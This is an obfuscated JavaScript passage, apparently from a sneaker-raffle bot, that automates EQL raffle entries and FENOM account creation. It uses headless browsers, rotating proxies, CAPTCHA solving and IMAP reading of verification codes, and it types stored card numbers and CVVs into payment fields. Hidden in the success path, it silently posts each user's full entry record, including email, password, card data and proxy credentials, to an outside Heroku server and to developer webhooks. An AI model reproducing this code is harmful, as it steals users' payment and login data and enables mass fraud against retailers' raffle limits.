                            await _0x5954fc(0x3e8), await _0x33c324['type']('#address1', _0x11f473[_0x4108c4]['Address1'] + '\x20' + _0x11f473[_0x4108c4]['HouseNumber']), await _0x5954fc(0x1f4), await _0x33c324['type']('#address2', '' + _0x11f473[_0x4108c4]['Address2']), await _0x5954fc(0x1f4), await _0x33c324['type']('#city', '' + _0x11f473[_0x4108c4]['City']), await _0x5954fc(0x1f4), await _0x33c324['type']('#postcode', '' + _0x11f473[_0x4108c4]['Zip']), await _0x5954fc(0x3e8), await _0x33c324['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x5954fc(0x3e8), console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x2c5003 = await _0x33c324['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x2c5003 && (await _0x33c324['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x33c324['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x33c324['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5954fc(0x4b0), await _0x33c324['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5954fc(0x1f4), await _0x33c324['keyboard']['type']('' + _0x11f473[_0x4108c4]['CardNumber']), await _0x5954fc(0x320), await _0x33c324['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x33c324['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x33c324['keyboard']['type']('' + _0x11f473[_0x4108c4]['ExpiryDate']), await _0x5954fc(0x4b0), await _0x33c324['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x33c324['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x33c324['keyboard']['type']('' + _0x11f473[_0x4108c4]['CVV']), await _0x5954fc(0x226), await _0x33c324['type']('input[name=\x22postalCode\x22]', '' + _0x11f473[_0x4108c4]['Zip']), await _0x5954fc(0x226));
                            const _0x1e1344 = await _0x33c324['$']('.__PrivateStripeElement');
                            _0x1e1344 && (await _0x5954fc(0x1f4), await _0x33c324['click']('.__PrivateStripeElement'), await _0x33c324['click']('.__PrivateStripeElement'), await _0x33c324['keyboard']['type']('' + _0x11f473[_0x4108c4]['CardNumber']), await _0x33c324['keyboard']['type']('' + _0x11f473[_0x4108c4]['ExpiryDate']), await _0x33c324['keyboard']['type']('' + _0x11f473[_0x4108c4]['CVV']));
                            await _0x5954fc(0x226), await _0x33c324['click']('#paymentConsent'), await _0x5954fc(0x226), await _0x33c324['click']('#termsConsent'), await _0x5954fc(0x2bc), console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x33c324['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x5954fc(0x2710);
                            try {
                                await _0x33c324['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x5954fc(0xbb8), await _0x33c324['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x15a803 => _0x15a803['click']()), await _0x33c324['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2eb3a2 => _0x2eb3a2['click']());
                            } catch {
                            }
                            try {
                                await _0x33c324['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x230be6 = await _0x33c324['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x230be6) {
                                    _0x1dee0c['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x11f473[_0x4108c4]['Email'] + ',' + _0x11f473[_0x4108c4]['Password'] + ',' + _0x11f473[_0x4108c4]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x1bf046() {
                                var _0x86506b, _0x2d4558 = ![];
                                for (var _0x346af2 = 0x0; _0x346af2 < 0x18; _0x346af2++) {
                                    async function _0x4ee12d() {
                                        var _0x115768 = new _0x15c146({
                                            'user': _0x5d2560['masterMail'],
                                            'password': _0x5d2560['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x3e5709(_0x58abf3) {
                                            _0x115768['openBox']('INBOX', ![], _0x58abf3);
                                        }
                                        _0x115768['once']('ready', function () {
                                            console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x3e5709(function (_0x1e1732, _0x26f60e) {
                                                console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x1e1732)
                                                    throw _0x1e1732;
                                                _0x115768['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x5dd790, _0x14716a) {
                                                    if (!_0x14716a || !_0x14716a['length'])
                                                        console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x115768['end']();
                                                    else {
                                                        var _0x53028b = _0x115768['seq']['fetch'](_0x14716a, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x53028b['on']('message', function (_0x452ccb, _0x2cee01) {
                                                            var _0x18e531 = '(#' + _0x2cee01 + ')\x20';
                                                            _0x452ccb['on']('body', function (_0x4e0661, _0x23f976) {
                                                                _0x2e3fa0(_0x4e0661, (_0xa87d64, _0x4581a3) => {
                                                                    if (_0x4581a3['subject']['includes']('code')) {
                                                                        const _0x355449 = _0x4581a3['text']['split']('\x0a\x0a')[0x3], _0x528518 = _0x355449['split']('\x0a')[0x1];
                                                                        _0x86506b = _0x528518;
                                                                    }
                                                                });
                                                            }), _0x452ccb['once']('end', function () {
                                                            });
                                                        }), _0x53028b['once']('error', function (_0x539ca8) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x53028b['once']('end', function () {
                                                            _0x115768['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x115768['once']('error', function (_0x11528e) {
                                            console['log'](_0x28396b['red'](_0x11528e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2d4558 = !![];
                                        }), _0x115768['once']('end', async function () {
                                        }), _0x115768['connect']();
                                    }
                                    _0x4ee12d(), await _0x5954fc(0x1388);
                                    if (_0x86506b)
                                        return _0x86506b;
                                    if (_0x2d4558)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x346af2 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x1bf046(), await _0x5954fc(0x1f4), await _0x33c324['type']('#code', '' + code), await _0x5954fc(0x3e8), await _0x33c324['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x968f09 => _0x968f09['click']()), await _0x33c324['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x33c324['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x11f473[_0x4108c4]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x1dee0c['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x11f473[_0x4108c4]['Email'] + ',' + _0x11f473[_0x4108c4]['Password'] + ',' + _0x11f473[_0x4108c4]['Phone']), _0x23ae58 = 'no', _0x4904f4(_0x11f473[_0x4108c4], _0x3a1370);
                            var _0x7604df = await _0xf2c38e(_0x11f473[_0x4108c4], _0x3a1370, 'dev', ![]), _0x1e9cb6 = await _0xf2c38e(_0x11f473[_0x4108c4], _0x3a1370, 'pub', ![]);
                            let _0x5a631d = _0x11f473[_0x4108c4];
                            try {
                                prxdata = {
                                    'username': _0x4a7d40['replace']('#', ''),
                                    'module': _0x3a1370['name'],
                                    'entrydata': JSON['stringify'](_0x5a631d),
                                    'proxy': '' + _0x1adb2d[_0x4108c4]
                                };
                                var _0x1167a2 = JSON['stringify'](prxdata);
                                let _0x5bd2e5 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x1167a2, _0x5bd2e5);
                            } catch (_0x3a9a34) {
                            }
                            const _0x587add = {
                                'succesDEVMSG': { 'embeds': [_0x7604df] },
                                'succesPUBMSG': { 'embeds': [_0x1e9cb6] }
                            };
                            try {
                                _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x587add['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x587add['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4b117a, _0x587add['succesPUBMSG']);
                            } catch (_0x6201e1) {
                                console['log'](_0x28396b['yellow'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x6201e1));
                            }
                        } catch (_0x5f01d8) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20' + _0x5f01d8)), _0x2fcd07 = '' + _0x5f01d8;
                            var _0x5aeb24 = await _0xf2c38e(_0x11f473[_0x4108c4], _0x3a1370, 'dev', !![], _0x2fcd07), _0x7604df = await _0xf2c38e(_0x11f473[_0x4108c4], _0x3a1370, 'dev', ![]), _0x1e9cb6 = await _0xf2c38e(_0x11f473[_0x4108c4], _0x3a1370, 'pub', ![]);
                            const _0x5cbb8a = {
                                'succesDEVMSG': { 'embeds': [_0x7604df] },
                                'succesPUBMSG': { 'embeds': [_0x1e9cb6] }
                            };
                            _0x5cbb8a['errorDEV'] = { 'embeds': [_0x5aeb24] };
                            _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x5cbb8a['errorDEV']);
                            await _0x4bfa5b(_0x248b77, _0x5cbb8a['errorDEV']);
                            if (!_0x23ae58 == 'no')
                                _0x23ae58 = 'yes';
                        } finally {
                            _0x253747 && _0x253747['close']();
                            if (_0x23ae58 == 'yes' && _0x551e82 != 0x5) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x551e82 + '\x20/\x205)')), _0x4108c4 = _0x4108c4 - 0x1, _0x551e82 = _0x551e82 + 0x1;
                                continue;
                            }
                            _0x23ae58 == 'yes' && _0x551e82 >= 0x5 && (_0x1c26ba(_0x11f473[_0x4108c4], _0x3a1370), _0x23ae58 = 'no', _0x551e82 = 0x0), console['log']('Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                        }
                    } else {
                        const _0x1cc253 = '' + _0x11f473[_0x4108c4]['Url'];
                        if (_0x23ae58 != 'yes')
                            var _0x23ae58 = '', _0x551e82 = 0x0;
                        if (_0x11f473[_0x4108c4]['Email'] == '' || _0x11f473[_0x4108c4]['FirstName'] == '' || _0x11f473[_0x4108c4]['LastName'] == '') {
                            console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x11f473[_0x4108c4]['Password'] == '' && (_0x11f473[_0x4108c4]['Password'] = 'JRaffles23!');
                        if (_0x5d2560['useRandomProxy'] = ![])
                            var _0x239503 = _0x1adb2d[_0x4108c4]['split'](':');
                        else
                            var _0x32076f = Math['round'](Math['random']() * (_0x1adb2d['length'] - 0x1)), _0x239503 = _0x1adb2d[_0x32076f]['split'](':');
                        var _0x253747;
                        try {
                            _0x253747 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x239503[0x0] + ':' + _0x239503[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x253747 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x239503[0x0] + ':' + _0x239503[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x48738f = await _0x253747['newPage']();
                            await _0x48738f['authenticate']({
                                'username': '' + _0x239503[0x2],
                                'password': '' + _0x239503[0x3]
                            }), console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x48738f['setRequestInterception'](!![]), _0x48738f['on']('request', _0x35735c => {
                                _0x35735c['resourceType']() === 'image' || _0x35735c['resourceType']() === 'font' || _0x35735c['resourceType']() === 'media' ? _0x35735c['abort']() : _0x35735c['continue']();
                            }), await _0x48738f['goto'](_0x1cc253), await _0x48738f['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button');
                            let _0x2d5a1e = await _0x48738f['$']('#gatsby-focus-wrapper\x20>\x20div:nth-child(3)\x20>\x20div\x20>\x20div\x20>\x20span\x20>\x20div\x20>\x20button.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButtonBase-root.css-78bdfl');
                            if (_0x2d5a1e)
                                await _0x2d5a1e['click']();
                            await _0x5954fc(0x7d0), await _0x48738f['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x5954fc(0x7d0), await _0x48738f['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x48738f['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x5954fc(0x3e8), await _0x48738f['waitForSelector']('#email'), console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x48738f['type']('#email', '' + _0x11f473[_0x4108c4]['Email']), await _0x5954fc(0x352), await _0x48738f['waitForSelector']('#password'), await _0x48738f['type']('#password', '' + _0x11f473[_0x4108c4]['Password']), await _0x5954fc(0x352), await _0x48738f['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x5954fc(0x1388);
                            if (!_0x11f473[_0x4108c4]['Url']['includes']('footlocker') && !_0x11f473[_0x4108c4]['Url']['includes']('topps'))
                                await _0x48738f['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x4f168b = await _0x48738f['$']('#productQuantity'), _0x575e44 = await _0x48738f['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x575e44 && !_0x4f168b) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x23ae58 = 'no';
                                continue;
                            }
                            if (_0x575e44) {
                                await _0x48738f['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x11f473[_0x4108c4]['Url']['includes']('en-GB') ? await _0x48738f['click']('li[data-value=\x22UK\x20' + _0x11f473[_0x4108c4]['Size'] + '\x20/\x20US\x20' + (Number(_0x11f473[_0x4108c4]['Size']) + 0x1) + '\x22]') : await _0x48738f['click']('li[data-value=\x22EU\x20' + _0x11f473[_0x4108c4]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x11f473[_0x4108c4]['Size']);
                                }
                            }
                            _0x4f168b && (await _0x48738f['click']('#productQuantity'), await _0x5954fc(0x3e8), await _0x48738f['click']('li[data-value=\x22' + (Number(_0x11f473[_0x4108c4]['Size']) - 0x1) + '\x22]'));
                            await _0x5954fc(0x3e8), await _0x5954fc(0x1f4);
                            const _0x5d8652 = await _0x48738f['$']('#title\x20>\x20label');
                            await _0x5954fc(0x12c);
                            _0x5d8652 && await _0x5d8652['click']();
                            await _0x48738f['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x48738f['focus']('#postcode'), await _0x48738f['keyboard']['down']('Control'), await _0x48738f['keyboard']['press']('A'), await _0x48738f['keyboard']['up']('Control'), await _0x48738f['keyboard']['press']('Backspace'), await _0x48738f['keyboard']['type'](_0x11f473[_0x4108c4]['Zip']), await _0x5954fc(0x60e), await _0x48738f['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x5954fc(0x3e8), console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x5954fc(0x1f4);
                            const _0x35a343 = await _0x48738f['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x35a343 && (await _0x48738f['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x48738f['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x48738f['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5954fc(0x4b0), await _0x48738f['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5954fc(0x1f4), await _0x48738f['keyboard']['type']('' + _0x11f473[_0x4108c4]['CardNumber']), await _0x5954fc(0x320), await _0x48738f['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x48738f['keyboard']['type']('' + _0x11f473[_0x4108c4]['ExpiryDate']), await _0x5954fc(0x4b0), await _0x48738f['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x48738f['keyboard']['type']('' + _0x11f473[_0x4108c4]['CVV']), await _0x5954fc(0x226), await _0x48738f['type']('input[name=\x22postalCode\x22]', '' + _0x11f473[_0x4108c4]['Zip']), await _0x5954fc(0x226));
                            const _0xd5b45b = await _0x48738f['$']('.__PrivateStripeElement');
                            _0xd5b45b && (await _0x48738f['click']('#billingName'), await _0x48738f['click']('#billingName'), await _0x48738f['type']('#billingName', '' + _0x11f473[_0x4108c4]['NameOnCard']), await _0x5954fc(0x1f4), await _0x48738f['click']('.__PrivateStripeElement'), await _0x48738f['click']('.__PrivateStripeElement'), await _0x48738f['keyboard']['type']('' + _0x11f473[_0x4108c4]['CardNumber']), await _0x48738f['keyboard']['type']('' + _0x11f473[_0x4108c4]['ExpiryDate']), await _0x48738f['keyboard']['type']('' + _0x11f473[_0x4108c4]['CVV']));
                            await _0x5954fc(0x226), await _0x48738f['click']('#paymentConsent'), await _0x5954fc(0x226), await _0x48738f['click']('#termsConsent'), await _0x5954fc(0x2bc), console['log'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x48738f['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x5954fc(0x2710);
                            try {
                                await _0x48738f['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x5954fc(0xbb8), await _0x48738f['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5ce230 => _0x5ce230['click']()), await _0x48738f['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1f4584 => _0x1f4584['click']());
                            } catch {
                            }
                            try {
                                await _0x48738f['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x4904f4(_0x11f473[_0x4108c4], _0x3a1370);
                            var _0x7604df = await _0xf2c38e(_0x11f473[_0x4108c4], _0x3a1370, 'dev', ![]), _0x1e9cb6 = await _0xf2c38e(_0x11f473[_0x4108c4], _0x3a1370, 'pub', ![]);
                            let _0x5987f3 = _0x11f473[_0x4108c4];
                            try {
                                prxdata = {
                                    'username': _0x4a7d40['replace']('#', ''),
                                    'module': _0x3a1370['name'],
                                    'entrydata': JSON['stringify'](_0x5987f3),
                                    'proxy': '' + _0x1adb2d[_0x4108c4]
                                };
                                var _0x1167a2 = JSON['stringify'](prxdata);
                                let _0x3e682a = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x1167a2, _0x3e682a);
                            } catch (_0x51877c) {
                            }
                            const _0x4c8ff7 = {
                                'succesDEVMSG': { 'embeds': [_0x7604df] },
                                'succesPUBMSG': { 'embeds': [_0x1e9cb6] }
                            };
                            try {
                                _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x4c8ff7['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x4c8ff7['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4b117a, _0x4c8ff7['succesPUBMSG']);
                            } catch (_0x438d91) {
                                console['log'](_0x28396b['yellow'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x438d91));
                            }
                            _0x23ae58 = 'no';
                        } catch (_0x1e6762) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20' + _0x1e6762)), _0x2fcd07 = '' + _0x1e6762;
                            var _0x5aeb24 = await _0xf2c38e(_0x11f473[_0x4108c4], _0x3a1370, 'dev', !![], _0x2fcd07), _0x7604df = await _0xf2c38e(_0x11f473[_0x4108c4], _0x3a1370, 'dev', ![]), _0x1e9cb6 = await _0xf2c38e(_0x11f473[_0x4108c4], _0x3a1370, 'pub', ![]);
                            const _0x2898d4 = {
                                'succesDEVMSG': { 'embeds': [_0x7604df] },
                                'succesPUBMSG': { 'embeds': [_0x1e9cb6] }
                            };
                            _0x2898d4['errorDEV'] = { 'embeds': [_0x5aeb24] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x2898d4['errorDEV']), await _0x4bfa5b(_0x248b77, _0x2898d4['errorDEV']), _0x23ae58 = 'yes';
                        } finally {
                            _0x253747 && _0x253747['close']();
                            if (_0x23ae58 == 'yes' && _0x551e82 != 0x5) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x3a1370['name'] + ']\x20Task\x20' + (_0x4108c4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x551e82 + '\x20/\x205)')), _0x4108c4 = _0x4108c4 - 0x1, _0x551e82 = _0x551e82 + 0x1;
                                continue;
                            }
                            _0x23ae58 == 'yes' && _0x551e82 >= 0x5 && (_0x1c26ba(_0x11f473[_0x4108c4], _0x3a1370), _0x23ae58 = 'no', _0x551e82 = 0x0), console['log']('Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x5766cf, _0x26e8b3, _0x180ef2) {
                    var _0x19c0aa = _0x26e8b3, _0x3b4ccc = 0x0;
                    for (var _0x141218 = 0x0; _0x141218 < _0x26e8b3['length']; _0x141218++) {
                        maxTasks = Number(_0x5d2560['threads']);
                        while (_0x3b4ccc >= maxTasks) {
                            await _0x5954fc(_0x5d2560['delay']);
                        }
                        let _0x26a9a8 = ![];
                        async function _0x501188(_0x428553, _0x24c6cd, _0x2d0f2f, _0xa4de36, _0x2db3fe) {
                            _0x3b4ccc++, _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x5d2560['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x2dad5c != 'yes')
                                var _0x2dad5c = '', _0x2db3fe = 0x0;
                            var _0x41ad3a;
                            try {
                                await _0x414596(_0x24c6cd, _0xa4de36);
                            } catch {
                                _0x2dad5c = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x34c195(_0x428553['name'] + '\x20Task\x20' + (_0xa4de36 + 0x1) + '\x20/\x20' + _0x24c6cd['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                            var _0x283163 = await _0xf2c38e(_0x24c6cd[_0xa4de36], _0x428553, 'acc', ![]);
                            const _0x1cfe3f = { 'succesDEVMSG': { 'embeds': [_0x283163] } }, _0x4267d6 = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x165cbe = Math['round'](Math['random']() * (_0x2d0f2f['length'] - 0x1)), _0x5c92f2 = _0x2d0f2f[_0x165cbe]['split'](':'), _0x4666e0;
                            async function _0x2374f5(_0x522ae9) {
                                const _0x3732cb = _0x1dee0c['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x9d7f6e = _0x548d40['parse'](_0x3732cb, { 'header': !![] })['data'];
                                let _0x38487c = ![];
                                for (var _0x3f5f54 of _0x9d7f6e) {
                                    if (_0x3f5f54['Email'] == _0x522ae9['Email']) {
                                        _0x38487c = !![];
                                        break;
                                    }
                                }
                                return _0x38487c;
                            }
                            try {
                                if (await _0x2374f5(_0x24c6cd[_0xa4de36]) == !![]) {
                                    console['log'](_0x52b59e() + '\x20[' + _0x428553['name'] + ']\x20Task\x20' + (_0xa4de36 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x26a9a8 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x4666e0 = await _0x13c80e['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x5c92f2[0x0] + ':' + _0x5c92f2[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x4666e0 = await _0x13c80e['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
